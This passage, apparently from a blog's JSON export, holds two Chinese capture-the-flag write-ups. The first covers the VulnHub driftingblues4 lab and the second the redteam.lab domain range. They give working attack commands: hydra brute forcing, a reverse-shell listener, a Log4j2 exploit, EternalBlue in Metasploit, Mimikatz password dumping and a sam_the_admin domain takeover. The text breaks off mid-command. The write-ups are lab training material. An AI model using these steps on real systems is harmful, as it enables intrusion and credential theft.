/>\n\n访问一下\n\n<img src=\"https://i.imgur.com/a4JjS76.png\" alt=\"img\" style=\"zoom: 67%;\" />\n\n#### 弱密码爆破\n\n提示了几个名字，试了ssh是不支持密码登录的，那就拿来爆破ftp试试\n\n```\nhydra -L /home/colin/桌面/user -P /usr/share/wordlists/rockyou.txt ftp://192.168.62.174\n```\n\n![](https://i.loli.net/2021/10/14/TGkAwWjDZs5zoOQ.png)\n\n成功得到了ftp的用户名和密码\n\n用得到的用户名和密码成功登录ftp\n\n<img src=\"https://i.loli.net/2021/10/14/YBD1hf4sIgpbxve.png\" style=\"zoom:80%;\" />\n\n看了一下好像没有什么信息，但是发现这个hubert目录是有写权限的，我们可以写一个ssh的key上去，然后在本地免密登录\n\n#### SSH免密登录\n\n先在靶机的hubert目录下创建一个.ssh目录\n\n![](https://i.loli.net/2021/10/14/pCZK8LhMB3wRJH5.png)\n\n将本地的authorized_keys上传到靶机\n\n<img src=\"https://i.loli.net/2021/10/14/T4Uo7cedGDLgWOC.png\" style=\"zoom: 80%;\" />\n\n成功登录到ssh\n\n<img src=\"https://i.loli.net/2021/10/14/kiIhwnUrsYcEjJu.png\" style=\"zoom:80%;\" />\n\n现在可以获取第一个flag了\n\n<img src=\"https://i.loli.net/2021/10/14/vQgpersjXcqxK7W.png\" style=\"zoom: 67%;\" />\n\n#### 权限提升\n\n/home/hubert目录下还有一个python脚本\n\n![](https://i.loli.net/2021/10/14/zw8cIdiTj2N45Q6.png)\n\n查看一下内容\n\n<img src=\"https://i.loli.net/2021/10/14/f9envx2HlPkoIVh.png\" style=\"zoom:67%;\" />\n\n执行脚本会以root权限执行一个命令，将1输出到一个文件里，去看一下这个文件\n\n<img src=\"https://i.loli.net/2021/10/14/9KScPokfV6iRd4B.png\" style=\"zoom:80%;\" />\n\n这个文件里已经有很多个1了，上面的python脚本应该是一直在执行的\n\n将进程监控工具上传到靶机，看一下这个脚本的运行情况\n\n先在本机起一个http服务\n\n![](https://i.loli.net/2021/10/14/lI4oASmUELGV5y1.png)\n\n在靶机下载，并赋予执行权限\n\n<img src=\"https://i.loli.net/2021/10/14/zFAc2jdn5OeKxyR.png\" style=\"zoom:80%;\" />\n\n发现emergency.py是每分钟执行一次的\n\n<img src=\"https://i.loli.net/2021/10/14/9a6mWdXpPG34buf.png\" style=\"zoom: 67%;\" />\n\n接下来尝试通过新建一个emergency.py来提权\n\n<img src=\"https://i.loli.net/2021/10/14/Eglnj4rwqHaeAOo.png\" style=\"zoom: 67%;\" />\n\n在本地开启一个监听端口来接收反弹的shell\n\n![](https://i.loli.net/2021/10/14/2vdQToUR1Bs5C3b.png)\n\n等了一会之后，本地已经接收到了shell\n\n![](https://i.loli.net/2021/10/14/DIiKmceuLlbyo1X.png)\n\n成功获取第二个flag\n\n<img src=\"https://i.loli.net/2021/10/14/QaX6UVWEoTiO5F3.png\" style=\"zoom:67%;\" />\n","source":"_posts/driftingblues4-VulnHub-Walkthrough.md","raw":"---\ntitle: driftingblues4 VulnHub Walkthrough\ndate: 2021-10-14 15:49:32\ncategories:\n- 渗透测试\ntags:\n- VulnHub\n---\n\n#### 主机发现\n\n```\narp-scan -l\n```\n\n<img src=\"https://i.loli.net/2021/10/14/zhRLGB6DEPml2uv.png\" style=\"zoom:67%;\" />\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.174\n```\n\n<img src=\"https://i.loli.net/2021/10/14/zLTuWXdBhYVneoM.png\" style=\"zoom: 67%;\" />\n\n开放了21、22、80端口，先看了下21端口，发现需要密码\n\n<img src=\"https://i.loli.net/2021/10/14/eoD7OHbsxQdl945.png\" style=\"zoom:67%;\" />\n\n再访问一下80端口，看看有没有什么信息\n\n![](https://i.loli.net/2021/10/14/RutLqmjfi95sKAS.png)\n\n#### 信息收集\n\n主页没有什么信息，看一下源码\n\n![](https://i.loli.net/2021/10/14/y43jOYEQP1Wtmrz.png)\n\nbase64编码，到在线网站转换一下\n\n<img src=\"https://i.loli.net/2021/10/14/iPnKaR3Hxc45Q9r.png\" style=\"zoom:50%;\" />\n\n再转换一次\n\n<img src=\"https://i.loli.net/2021/10/14/ITbCv2kKSmcjZhH.png\" style=\"zoom:50%;\" />\n\nemmm，继续\n\n<img src=\"https://i.loli.net/2021/10/14/bLqOkQABpI4UN6v.png\" style=\"zoom:50%;\" />\n\n<img src=\"https://i.loli.net/2021/10/14/KkXxDfubgw8l7BE.png\" style=\"zoom:50%;\" />\n\n最后得到一个txt的路径，访问一下\n\n<img src=\"https://i.loli.net/2021/10/14/sLfinMZNFSBem8y.png\" style=\"zoom: 67%;\" />\n\nBrainfuck加密，到在线网站解密一下\n\n![](https://i.loli.net/2021/10/14/k8BNGWeDhpK4HcX.png)\n\n得到了一张图片的路径，访问一下\n\n是一个二维码\n\n<img src=\"https://i.loli.net/2021/10/14/S1lyGvhiRO5VoWk.png\" style=\"zoom: 33%;\" />\n\n扫描的结果是一张图片地址\n\n<img src=\"https://i.loli.net/2021/10/14/ri9wbhBXtmn21Wv.png\" style=\"zoom:80%;\" />\n\n访问一下\n\n<img src=\"https://i.imgur.com/a4JjS76.png\" alt=\"img\" style=\"zoom: 67%;\" />\n\n#### 弱密码爆破\n\n提示了几个名字，试了ssh是不支持密码登录的，那就拿来爆破ftp试试\n\n```\nhydra -L /home/colin/桌面/user -P /usr/share/wordlists/rockyou.txt ftp://192.168.62.174\n```\n\n![](https://i.loli.net/2021/10/14/TGkAwWjDZs5zoOQ.png)\n\n成功得到了ftp的用户名和密码\n\n用得到的用户名和密码成功登录ftp\n\n<img src=\"https://i.loli.net/2021/10/14/YBD1hf4sIgpbxve.png\" style=\"zoom:80%;\" />\n\n看了一下好像没有什么信息，但是发现这个hubert目录是有写权限的，我们可以写一个ssh的key上去，然后在本地免密登录\n\n#### SSH免密登录\n\n先在靶机的hubert目录下创建一个.ssh目录\n\n![](https://i.loli.net/2021/10/14/pCZK8LhMB3wRJH5.png)\n\n将本地的authorized_keys上传到靶机\n\n<img src=\"https://i.loli.net/2021/10/14/T4Uo7cedGDLgWOC.png\" style=\"zoom: 80%;\" />\n\n成功登录到ssh\n\n<img src=\"https://i.loli.net/2021/10/14/kiIhwnUrsYcEjJu.png\" style=\"zoom:80%;\" />\n\n现在可以获取第一个flag了\n\n<img src=\"https://i.loli.net/2021/10/14/vQgpersjXcqxK7W.png\" style=\"zoom: 67%;\" />\n\n#### 权限提升\n\n/home/hubert目录下还有一个python脚本\n\n![](https://i.loli.net/2021/10/14/zw8cIdiTj2N45Q6.png)\n\n查看一下内容\n\n<img src=\"https://i.loli.net/2021/10/14/f9envx2HlPkoIVh.png\" style=\"zoom:67%;\" />\n\n执行脚本会以root权限执行一个命令，将1输出到一个文件里，去看一下这个文件\n\n<img src=\"https://i.loli.net/2021/10/14/9KScPokfV6iRd4B.png\" style=\"zoom:80%;\" />\n\n这个文件里已经有很多个1了，上面的python脚本应该是一直在执行的\n\n将进程监控工具上传到靶机，看一下这个脚本的运行情况\n\n先在本机起一个http服务\n\n![](https://i.loli.net/2021/10/14/lI4oASmUELGV5y1.png)\n\n在靶机下载，并赋予执行权限\n\n<img src=\"https://i.loli.net/2021/10/14/zFAc2jdn5OeKxyR.png\" style=\"zoom:80%;\" />\n\n发现emergency.py是每分钟执行一次的\n\n<img src=\"https://i.loli.net/2021/10/14/9a6mWdXpPG34buf.png\" style=\"zoom: 67%;\" />\n\n接下来尝试通过新建一个emergency.py来提权\n\n<img src=\"https://i.loli.net/2021/10/14/Eglnj4rwqHaeAOo.png\" style=\"zoom: 67%;\" />\n\n在本地开启一个监听端口来接收反弹的shell\n\n![](https://i.loli.net/2021/10/14/2vdQToUR1Bs5C3b.png)\n\n等了一会之后，本地已经接收到了shell\n\n![](https://i.loli.net/2021/10/14/DIiKmceuLlbyo1X.png)\n\n成功获取第二个flag\n\n<img src=\"https://i.loli.net/2021/10/14/QaX6UVWEoTiO5F3.png\" style=\"zoom:67%;\" />\n","slug":"driftingblues4-VulnHub-Walkthrough","published":1,"updated":"2021-12-25T12:19:50.096Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyr001cwku10ybg17cz","content":"<h4 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h4><pre><code>arp-scan -l\n</code></pre>\n<img src=\"https://i.loli.net/2021/10/14/zhRLGB6DEPml2uv.png\" style=\"zoom:67%;\" />\n\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.174\n</code></pre>\n<img src=\"https://i.loli.net/2021/10/14/zLTuWXdBhYVneoM.png\" style=\"zoom: 67%;\" />\n\n<p>开放了21、22、80端口，先看了下21端口，发现需要密码</p>\n<img src=\"https://i.loli.net/2021/10/14/eoD7OHbsxQdl945.png\" style=\"zoom:67%;\" />\n\n<p>再访问一下80端口，看看有没有什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/14/RutLqmjfi95sKAS.png\"></p>\n<h4 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h4><p>主页没有什么信息，看一下源码</p>\n<p><img src=\"https://i.loli.net/2021/10/14/y43jOYEQP1Wtmrz.png\"></p>\n<p>base64编码，到在线网站转换一下</p>\n<img src=\"https://i.loli.net/2021/10/14/iPnKaR3Hxc45Q9r.png\" style=\"zoom:50%;\" />\n\n<p>再转换一次</p>\n<img src=\"https://i.loli.net/2021/10/14/ITbCv2kKSmcjZhH.png\" style=\"zoom:50%;\" />\n\n<p>emmm，继续</p>\n<img src=\"https://i.loli.net/2021/10/14/bLqOkQABpI4UN6v.png\" style=\"zoom:50%;\" />\n\n<img src=\"https://i.loli.net/2021/10/14/KkXxDfubgw8l7BE.png\" style=\"zoom:50%;\" />\n\n<p>最后得到一个txt的路径，访问一下</p>\n<img src=\"https://i.loli.net/2021/10/14/sLfinMZNFSBem8y.png\" style=\"zoom: 67%;\" />\n\n<p>Brainfuck加密，到在线网站解密一下</p>\n<p><img src=\"https://i.loli.net/2021/10/14/k8BNGWeDhpK4HcX.png\"></p>\n<p>得到了一张图片的路径，访问一下</p>\n<p>是一个二维码</p>\n<img src=\"https://i.loli.net/2021/10/14/S1lyGvhiRO5VoWk.png\" style=\"zoom: 33%;\" />\n\n<p>扫描的结果是一张图片地址</p>\n<img src=\"https://i.loli.net/2021/10/14/ri9wbhBXtmn21Wv.png\" style=\"zoom:80%;\" />\n\n<p>访问一下</p>\n<img src=\"https://i.imgur.com/a4JjS76.png\" alt=\"img\" style=\"zoom: 67%;\" />\n\n<h4 id=\"弱密码爆破\"><a href=\"#弱密码爆破\" class=\"headerlink\" title=\"弱密码爆破\"></a>弱密码爆破</h4><p>提示了几个名字，试了ssh是不支持密码登录的，那就拿来爆破ftp试试</p>\n<pre><code>hydra -L /home/colin/桌面/user -P /usr/share/wordlists/rockyou.txt ftp://192.168.62.174\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/14/TGkAwWjDZs5zoOQ.png\"></p>\n<p>成功得到了ftp的用户名和密码</p>\n<p>用得到的用户名和密码成功登录ftp</p>\n<img src=\"https://i.loli.net/2021/10/14/YBD1hf4sIgpbxve.png\" style=\"zoom:80%;\" />\n\n<p>看了一下好像没有什么信息，但是发现这个hubert目录是有写权限的，我们可以写一个ssh的key上去，然后在本地免密登录</p>\n<h4 id=\"SSH免密登录\"><a href=\"#SSH免密登录\" class=\"headerlink\" title=\"SSH免密登录\"></a>SSH免密登录</h4><p>先在靶机的hubert目录下创建一个.ssh目录</p>\n<p><img src=\"https://i.loli.net/2021/10/14/pCZK8LhMB3wRJH5.png\"></p>\n<p>将本地的authorized_keys上传到靶机</p>\n<img src=\"https://i.loli.net/2021/10/14/T4Uo7cedGDLgWOC.png\" style=\"zoom: 80%;\" />\n\n<p>成功登录到ssh</p>\n<img src=\"https://i.loli.net/2021/10/14/kiIhwnUrsYcEjJu.png\" style=\"zoom:80%;\" />\n\n<p>现在可以获取第一个flag了</p>\n<img src=\"https://i.loli.net/2021/10/14/vQgpersjXcqxK7W.png\" style=\"zoom: 67%;\" />\n\n<h4 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h4><p>/home/hubert目录下还有一个python脚本</p>\n<p><img src=\"https://i.loli.net/2021/10/14/zw8cIdiTj2N45Q6.png\"></p>\n<p>查看一下内容</p>\n<img src=\"https://i.loli.net/2021/10/14/f9envx2HlPkoIVh.png\" style=\"zoom:67%;\" />\n\n<p>执行脚本会以root权限执行一个命令，将1输出到一个文件里，去看一下这个文件</p>\n<img src=\"https://i.loli.net/2021/10/14/9KScPokfV6iRd4B.png\" style=\"zoom:80%;\" />\n\n<p>这个文件里已经有很多个1了，上面的python脚本应该是一直在执行的</p>\n<p>将进程监控工具上传到靶机，看一下这个脚本的运行情况</p>\n<p>先在本机起一个http服务</p>\n<p><img src=\"https://i.loli.net/2021/10/14/lI4oASmUELGV5y1.png\"></p>\n<p>在靶机下载，并赋予执行权限</p>\n<img src=\"https://i.loli.net/2021/10/14/zFAc2jdn5OeKxyR.png\" style=\"zoom:80%;\" />\n\n<p>发现emergency.py是每分钟执行一次的</p>\n<img src=\"https://i.loli.net/2021/10/14/9a6mWdXpPG34buf.png\" style=\"zoom: 67%;\" />\n\n<p>接下来尝试通过新建一个emergency.py来提权</p>\n<img src=\"https://i.loli.net/2021/10/14/Eglnj4rwqHaeAOo.png\" style=\"zoom: 67%;\" />\n\n<p>在本地开启一个监听端口来接收反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/10/14/2vdQToUR1Bs5C3b.png\"></p>\n<p>等了一会之后，本地已经接收到了shell</p>\n<p><img src=\"https://i.loli.net/2021/10/14/DIiKmceuLlbyo1X.png\"></p>\n<p>成功获取第二个flag</p>\n<img src=\"https://i.loli.net/2021/10/14/QaX6UVWEoTiO5F3.png\" style=\"zoom:67%;\" />\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h4><pre><code>arp-scan -l\n</code></pre>\n<img src=\"https://i.loli.net/2021/10/14/zhRLGB6DEPml2uv.png\" style=\"zoom:67%;\" />\n\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.174\n</code></pre>\n<img src=\"https://i.loli.net/2021/10/14/zLTuWXdBhYVneoM.png\" style=\"zoom: 67%;\" />\n\n<p>开放了21、22、80端口，先看了下21端口，发现需要密码</p>\n<img src=\"https://i.loli.net/2021/10/14/eoD7OHbsxQdl945.png\" style=\"zoom:67%;\" />\n\n<p>再访问一下80端口，看看有没有什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/14/RutLqmjfi95sKAS.png\"></p>\n<h4 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h4><p>主页没有什么信息，看一下源码</p>\n<p><img src=\"https://i.loli.net/2021/10/14/y43jOYEQP1Wtmrz.png\"></p>\n<p>base64编码，到在线网站转换一下</p>\n<img src=\"https://i.loli.net/2021/10/14/iPnKaR3Hxc45Q9r.png\" style=\"zoom:50%;\" />\n\n<p>再转换一次</p>\n<img src=\"https://i.loli.net/2021/10/14/ITbCv2kKSmcjZhH.png\" style=\"zoom:50%;\" />\n\n<p>emmm，继续</p>\n<img src=\"https://i.loli.net/2021/10/14/bLqOkQABpI4UN6v.png\" style=\"zoom:50%;\" />\n\n<img src=\"https://i.loli.net/2021/10/14/KkXxDfubgw8l7BE.png\" style=\"zoom:50%;\" />\n\n<p>最后得到一个txt的路径，访问一下</p>\n<img src=\"https://i.loli.net/2021/10/14/sLfinMZNFSBem8y.png\" style=\"zoom: 67%;\" />\n\n<p>Brainfuck加密，到在线网站解密一下</p>\n<p><img src=\"https://i.loli.net/2021/10/14/k8BNGWeDhpK4HcX.png\"></p>\n<p>得到了一张图片的路径，访问一下</p>\n<p>是一个二维码</p>\n<img src=\"https://i.loli.net/2021/10/14/S1lyGvhiRO5VoWk.png\" style=\"zoom: 33%;\" />\n\n<p>扫描的结果是一张图片地址</p>\n<img src=\"https://i.loli.net/2021/10/14/ri9wbhBXtmn21Wv.png\" style=\"zoom:80%;\" />\n\n<p>访问一下</p>\n<img src=\"https://i.imgur.com/a4JjS76.png\" alt=\"img\" style=\"zoom: 67%;\" />\n\n<h4 id=\"弱密码爆破\"><a href=\"#弱密码爆破\" class=\"headerlink\" title=\"弱密码爆破\"></a>弱密码爆破</h4><p>提示了几个名字，试了ssh是不支持密码登录的，那就拿来爆破ftp试试</p>\n<pre><code>hydra -L /home/colin/桌面/user -P /usr/share/wordlists/rockyou.txt ftp://192.168.62.174\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/14/TGkAwWjDZs5zoOQ.png\"></p>\n<p>成功得到了ftp的用户名和密码</p>\n<p>用得到的用户名和密码成功登录ftp</p>\n<img src=\"https://i.loli.net/2021/10/14/YBD1hf4sIgpbxve.png\" style=\"zoom:80%;\" />\n\n<p>看了一下好像没有什么信息，但是发现这个hubert目录是有写权限的，我们可以写一个ssh的key上去，然后在本地免密登录</p>\n<h4 id=\"SSH免密登录\"><a href=\"#SSH免密登录\" class=\"headerlink\" title=\"SSH免密登录\"></a>SSH免密登录</h4><p>先在靶机的hubert目录下创建一个.ssh目录</p>\n<p><img src=\"https://i.loli.net/2021/10/14/pCZK8LhMB3wRJH5.png\"></p>\n<p>将本地的authorized_keys上传到靶机</p>\n<img src=\"https://i.loli.net/2021/10/14/T4Uo7cedGDLgWOC.png\" style=\"zoom: 80%;\" />\n\n<p>成功登录到ssh</p>\n<img src=\"https://i.loli.net/2021/10/14/kiIhwnUrsYcEjJu.png\" style=\"zoom:80%;\" />\n\n<p>现在可以获取第一个flag了</p>\n<img src=\"https://i.loli.net/2021/10/14/vQgpersjXcqxK7W.png\" style=\"zoom: 67%;\" />\n\n<h4 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h4><p>/home/hubert目录下还有一个python脚本</p>\n<p><img src=\"https://i.loli.net/2021/10/14/zw8cIdiTj2N45Q6.png\"></p>\n<p>查看一下内容</p>\n<img src=\"https://i.loli.net/2021/10/14/f9envx2HlPkoIVh.png\" style=\"zoom:67%;\" />\n\n<p>执行脚本会以root权限执行一个命令，将1输出到一个文件里，去看一下这个文件</p>\n<img src=\"https://i.loli.net/2021/10/14/9KScPokfV6iRd4B.png\" style=\"zoom:80%;\" />\n\n<p>这个文件里已经有很多个1了，上面的python脚本应该是一直在执行的</p>\n<p>将进程监控工具上传到靶机，看一下这个脚本的运行情况</p>\n<p>先在本机起一个http服务</p>\n<p><img src=\"https://i.loli.net/2021/10/14/lI4oASmUELGV5y1.png\"></p>\n<p>在靶机下载，并赋予执行权限</p>\n<img src=\"https://i.loli.net/2021/10/14/zFAc2jdn5OeKxyR.png\" style=\"zoom:80%;\" />\n\n<p>发现emergency.py是每分钟执行一次的</p>\n<img src=\"https://i.loli.net/2021/10/14/9a6mWdXpPG34buf.png\" style=\"zoom: 67%;\" />\n\n<p>接下来尝试通过新建一个emergency.py来提权</p>\n<img src=\"https://i.loli.net/2021/10/14/Eglnj4rwqHaeAOo.png\" style=\"zoom: 67%;\" />\n\n<p>在本地开启一个监听端口来接收反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/10/14/2vdQToUR1Bs5C3b.png\"></p>\n<p>等了一会之后，本地已经接收到了shell</p>\n<p><img src=\"https://i.loli.net/2021/10/14/DIiKmceuLlbyo1X.png\"></p>\n<p>成功获取第二个flag</p>\n<img src=\"https://i.loli.net/2021/10/14/QaX6UVWEoTiO5F3.png\" style=\"zoom:67%;\" />\n"},{"title":"渗透攻击红队域渗透靶场-2(redteam.lab)Writeup","date":"2021-12-25T12:25:57.000Z","_content":"\n```\n知识点：log4j2 RCE、CVE-2021-42287、CVE-2021-42278、MS17-010漏洞利用、frp内网穿透、MSF搭建socks代理\n```\n\n## 前言\n\n本次靶场是 **渗透攻击红队** 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：Log4j2 RCE、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：\n\n![](https://s2.loli.net/2021/12/25/nUgrAER1a7uck4T.png)\n\nPS：靶场下载地址关注微信公众号：**红队攻防实验室** 回复：**001** 即可获取到下载地址。\n\n## 信息收集\n\n```\nUbuntu Desktop ip：192.168.124.8（模拟服务器公网ip）\nKali ip：192.168.124.7\n```\n\n### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.124.8\n```\n\n![](https://s2.loli.net/2021/12/25/isQdo7n8YMO63zr.png)\n\n一台Ubuntu机器，开放了两个端口`22`、`38080`\n\n### 漏洞发现\n\n`22`端口暂时无法利用，先访问`38080`端口\n\n![](https://s2.loli.net/2021/12/25/P8aAskWUO9GMgin.png)\n\n是一个web服务，直接尝试最近爆出的`CVE-2021-44228`Log4j2 rce漏洞，看看能不能获取到 `dnslog`\n\n![](https://s2.loli.net/2021/12/25/rahfqH8YAns4bOX.png)\n\n发现存在`CVE-2021-44228`log4j2 rce漏洞。接下来利用该漏洞反弹shell\n\n## CVE-2021-44228漏洞利用\n\n使用[工具](https://github.com/feihong-cs/JNDIExploit)在**Kali**终端（192.168.124.7）开启一个LDAP：\n\n![](https://s2.loli.net/2021/12/25/Lx32deqBcDFZNjE.png)\n\n并开启一个监听端口，来接收反弹的shell\n\n```\nnc -lnvp 4444\n```\n\n![](https://s2.loli.net/2021/12/25/8YgNSkslQJOzM7u.png)\n\n使用EXP成功反弹shell\n\n![](https://s2.loli.net/2021/12/25/V4vcumZy7A1CaSh.png)\n\n当前的shell是一个Docker环境\n\n![](https://s2.loli.net/2021/12/25/KTxhpcBFZdftOwo.png)\n\n![](https://s2.loli.net/2021/12/25/rEHbGacJxSXnMIk.png)\n\n在`/root/\t`目录下找到了flag，给出了一个账号密码，应该是端口扫描时发现开放的`SSH`的账号密码\n\n![](https://s2.loli.net/2021/12/25/h2ud3zKTJoUebL9.png)\n\n## 内网信息收集\n\n使用获得的账号密码成功登录`SSH`服务\n\n![](https://s2.loli.net/2021/12/25/4dqi6MFtcluaoJN.png)\n\n`ifconfig`发现该机器有双网卡，其中 `ens33` 是外网的网卡，`ens38` （10.0.1.6）是内网网卡\n\n![](https://s2.loli.net/2021/12/25/p2shzE5quwoUyYQ.png)\n\n我们用 `for` 循环 `ping` 一下 `ens38` 的 `C` 段：\n\n```\nfor i in 10.0.1.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i Find the target; fi; done\n```\n\n发现有一台存活主机`10.0.1.7`\n\n![](https://s2.loli.net/2021/12/25/hYRtSfk19maZHLC.png)\n\n## 内网横向渗透\n\n### frp流量转发\n\n使用[**frp**](https://github.com/fatedier/frp)将已获取到权限的`Ubuntu`的流量代理出来，这样就可以通过`Kali`来对内网存活主机进行渗透了\n\n我们先要将`frp`上传到`Ubuntu`中，在`Kali`开启一个`HTTP`服务\n\n```\npython3 -m http.server 80\n```\n\n![](https://s2.loli.net/2021/12/25/5isFM4qrH1UEnYv.png)\n\n然后在`Ubuntu`中下载\n\n![](https://s2.loli.net/2021/12/25/aG3SCVZQzI7q2Ru.png)\n\n在`Ubuntu`中给予`frp.tar.gz`执行权限，并解压\n\n```\nchmod +x frp.tar.gz\ntar -zxvf frp.tar.gz\n```\n\n![](https://s2.loli.net/2021/12/25/Sl1c4gfoekZ8shP.png)\n\n进入`frp`目录，配置好`frpc.ini`\n\n![](https://s2.loli.net/2021/12/25/y9CkpEQPce3hdXv.png)\n\n然后回到`Kali`终端开启`frp`的服务端\n\n![](https://s2.loli.net/2021/12/25/3EN1aGQRTntbqWx.png)\n\n再在`Ubuntu`中启动客户端\n\n![](https://s2.loli.net/2021/12/25/MoNUh7RAvKOrGg1.png)\n\n此时`Kali`的服务端就有响应了\n\n![](https://s2.loli.net/2021/12/25/hZ8RaToDQHGbutX.png)\n\n### MSF设置Socks 代理\n\n```\nsetg Proxies socks5:192.168.124.7:7777\nsetg ReverseAllowProxy true\n```\n\n![](https://s2.loli.net/2021/12/25/RNX9WnoepZrf3wu.png)\n\n使用 `smb` 版本探测模块对目标进行扫描：\n\n```\nuse auxiliary/scanner/smb/smb_version\nset rhosts 10.0.1.7\n```\n\n![](https://s2.loli.net/2021/12/25/JuiYcMgrLHnzGqw.png)\n\n发现目标 `10.0.1.7`系统 版本是 `Windows 7`，且存在域 `REDTEAM`\n\n接着探测目标是否存在经典的`MS17-010`漏洞\n\n### MS17-010 漏洞探测与利用\n\n```\nuse auxiliary/scanner/smb/smb_ms17_010\nset rhosts 10.0.1.7\n```\n\n![](https://s2.loli.net/2021/12/25/Mx7V4XuLn9gImwy.png)\n\n目标主机`win7`确实存在`永恒之蓝`漏洞\n\n接下来我们继续使用`MSF`的模块进行漏洞利用，由于目标机器不一定出网，我们选择用正向连接的`payload`\n\n```\nuse windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp\nset rhosts 10.0.1.7\nrun\n```\n\n<img src=\"https://s2.loli.net/2021/12/25/wMnTPC3NlLJ9AgK.png\" style=\"zoom: 80%;\" />\n\n成功获得一个`meterpreter`\n\n![](https://s2.loli.net/2021/12/25/jDzbevUSNAP1LVu.png)\n\n拿到 `Win7` 权限后加载 `Mimikatz` 抓取明文密码\n\n```\nload mimikatz\ncreds_all\n```\n\n![](https://s2.loli.net/2021/12/25/K7d4GxDLbOzhECN.png)\n\n此时我们得到了一个域用户的账号密码\n\n## 域渗透\n\n### 域内信息收集\n\n```\nhostname\nnet user /domain\nipconfig\n```\n\n![](https://s2.loli.net/2021/12/25/wLe1nTbmszfFRSu.png)\n\n![](https://s2.loli.net/2021/12/25/P4INuV6HBbDZhaR.png)\n\n发现`win7`还有一个内网网卡，接着我们需要定位域控\n\n```\nnet group \"Domain Controllers\" /domain\nping DC\n```\n\n![](https://s2.loli.net/2021/12/25/grtlYL3HQ4JcWwU.png)\n\n定位到域控到域控 `IP` 为 `10.0.0.12` ，接下来直接尝试最近爆出的两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278\n\n**具体：**[只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）](https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&mid=2247483681&idx=1&sn=5757667e1a2f812244fe17b50ce46c27&chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&scene=21#wechat_redirect)\n\n### MSF流量转发\n\n我们先将`win7`的流量代理出来，然后在`Kali`中实现域内提权\n\n先添加路由：\n\n```\nrun autoroute -s 10.0.0.7/24\n```\n\n![](https://s2.loli.net/2021/12/25/rQkhlwGEZcsm9zK.png)\n\n使用 MSF 添加了一个 Socks：\n\n```\nbackground\nuse auxiliary/server/socks_proxy\nrun\n```\n\n![](https://s2.loli.net/2021/12/25/GHaZPjcoNR8Dwnu.png)\n\n接着修改`proxychain`配置文件\n\n```\nvim /etc/proxychains4.conf\n```\n\n![](https://s2.loli.net/2021/12/25/nkmBMlRVItbWEsh.png)\n\n直接使用[脚本](https://github.com/WazeHell/sam-the-admin)利用漏洞进行域内提权\n\n```\nproxychains python3 sam_the_admin.py \"redteam/root:Red12345\" -dc-ip 10.0.0.12 -shell\n```\n\n![](https://s2.loli.net/2021/12/25/sojU6f8SKgOC7vb.png)\n\n最后拿到最终的flag\n\n![](https://s2.loli.net/2021/12/25/TktQN23dHpwsiJh.png)\n","source":"_posts/渗透攻击红队域渗透靶场-2-redteam-lab-Writeup.md","raw":"---\ntitle: 渗透攻击红队域渗透靶场-2(redteam.lab)Writeup\ndate: 2021-12-25 20:25:57\ncategories:\n- 渗透测试\ntags:\n- 域渗透\n---\n\n```\n知识点：log4j2 RCE、CVE-2021-42287、CVE-2021-42278、MS17-010漏洞利用、frp内网穿透、MSF搭建socks代理\n```\n\n## 前言\n\n本次靶场是 **渗透攻击红队** 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：Log4j2 RCE、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：\n\n![](https://s2.loli.net/2021/12/25/nUgrAER1a7uck4T.png)\n\nPS：靶场下载地址关注微信公众号：**红队攻防实验室** 回复：**001** 即可获取到下载地址。\n\n## 信息收集\n\n```\nUbuntu Desktop ip：192.168.124.8（模拟服务器公网ip）\nKali ip：192.168.124.7\n```\n\n### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.124.8\n```\n\n![](https://s2.loli.net/2021/12/25/isQdo7n8YMO63zr.png)\n\n一台Ubuntu机器，开放了两个端口`22`、`38080`\n\n### 漏洞发现\n\n`22`端口暂时无法利用，先访问`38080`端口\n\n![](https://s2.loli.net/2021/12/25/P8aAskWUO9GMgin.png)\n\n是一个web服务，直接尝试最近爆出的`CVE-2021-44228`Log4j2 rce漏洞，看看能不能获取到 `dnslog`\n\n![](https://s2.loli.net/2021/12/25/rahfqH8YAns4bOX.png)\n\n发现存在`CVE-2021-44228`log4j2 rce漏洞。接下来利用该漏洞反弹shell\n\n## CVE-2021-44228漏洞利用\n\n使用[工具](https://github.com/feihong-cs/JNDIExploit)在**Kali**终端（192.168.124.7）开启一个LDAP：\n\n![](https://s2.loli.net/2021/12/25/Lx32deqBcDFZNjE.png)\n\n并开启一个监听端口，来接收反弹的shell\n\n```\nnc -lnvp 